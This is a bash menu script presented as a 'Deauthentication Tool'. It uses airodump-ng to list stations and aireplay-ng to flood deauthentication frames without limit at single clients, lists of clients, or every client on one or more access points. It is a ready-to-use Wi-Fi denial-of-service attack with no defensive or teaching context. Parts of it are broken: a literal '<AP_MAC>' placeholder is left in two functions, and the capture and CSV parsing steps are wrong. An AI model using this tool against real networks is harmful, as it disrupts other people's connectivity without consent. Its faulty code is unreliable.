#!/bin/bash

# Function to show connected devices and their MAC addresses
show_connected_devices() {
  echo "Connected Devices:"
  airodump-ng -w /tmp/airodump wlan0mon
  cat /tmp/airodump-01.csv | grep "Station" | awk '{print $1}' | sort -u
}

# Function to deauthenticate a single device
deauth_single_device() {
  read -p "Enter the MAC address of the device to deauthenticate: " client_mac
  aireplay-ng -0 0 -a <AP_MAC> -c $client_mac wlan0mon
}

# Function to deauthenticate multiple devices
deauth_multiple_devices() {
  read -p "Enter the MAC addresses of the devices to deauthenticate (separated by spaces): " client_macs
  for mac in $client_macs; do
    aireplay-ng -0 0 -a <AP_MAC> -c $mac wlan0mon
  done
}

# Function to deauthenticate all devices connected to a specific AP
deauth_all_devices_ap() {
  read -p "Enter the MAC address of the AP: " ap_mac
  aireplay-ng -0 0 -a $ap_mac wlan0mon
}

# Function to deauthenticate all devices connected to multiple APs
deauth_all_devices_multiple_ap() {
  read -p "Enter the MAC addresses of the APs (separated by spaces): " ap_macs
  for mac in $ap_macs; do
    aireplay-ng -0 0 -a $mac wlan0mon
  done
}

# Main menu
while true; do
  echo "Deauthentication Tool"
  echo "---------------------"
  echo "1. Show connected devices"
  echo "2. Deauthenticate a single device"
  echo "3. Deauthenticate multiple devices"
  echo "4. Deauthenticate all devices connected to a specific AP"
  echo "5. Deauthenticate all devices connected to multiple APs"
  echo "6. Exit"
  read -p "Enter your choice: " choice

  case $choice in
    1) show_connected_devices ;;
    2) deauth_single_device ;;
    3) deauth_multiple_devices ;;
    4) deauth_all_devices_ap ;;
    5) deauth_all_devices_multiple_ap ;;
    6) exit ;;
    *) echo "Invalid choice. Try again!" ;;
  esac
done
